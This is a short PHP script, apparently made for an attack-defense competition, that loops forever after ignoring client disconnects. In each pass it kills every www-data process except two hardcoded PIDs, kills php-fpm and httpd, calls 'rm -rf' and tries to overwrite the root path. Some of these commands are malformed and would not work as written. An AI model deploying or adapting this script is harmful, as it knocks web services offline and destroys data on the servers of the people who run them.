<?php
    ignore_user_abort(true);
    while (1){
        system("kill `ps aux | grep www-data | awk '{print $2}' | grep -v -E '^(2645622|2645623)$'| xargs kill -9`");//过滤ssh登录前的www-data  pid
        system("kill `ps -ef | grep php-fpm | grep -v grep | awk '{print $2}'`");
        system("kill `ps -ef | grep httpd | grep -v grep | awk '{print $2}'`");
        system("rm -rf ");
        system("echo '<?php?>' > / ");
        usleep(0);
    }
